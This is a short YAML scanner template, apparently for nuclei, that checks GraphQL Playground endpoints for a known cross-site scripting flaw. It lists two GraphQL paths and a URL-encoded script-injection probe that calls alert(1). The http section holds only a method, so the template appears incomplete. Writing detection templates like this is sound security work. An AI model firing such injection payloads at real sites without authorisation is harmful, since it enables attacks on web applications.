# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
id: graphql-playround-xss
info:
  name: Graphql Playground XSS
  author: unknown
  severity: info

  references:
    - link: https://github.com/prisma-labs/graphql-playground/security/advisories/GHSA-4852-vrh7-28rf
params:
  - root: '{{.BaseURL}}'

variables:
  - graph: |
      /graphql/
      /apis/dashboards/v1/graphql/
  - xss: |
      %3C%2Fscript%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
http:
  - method: GET
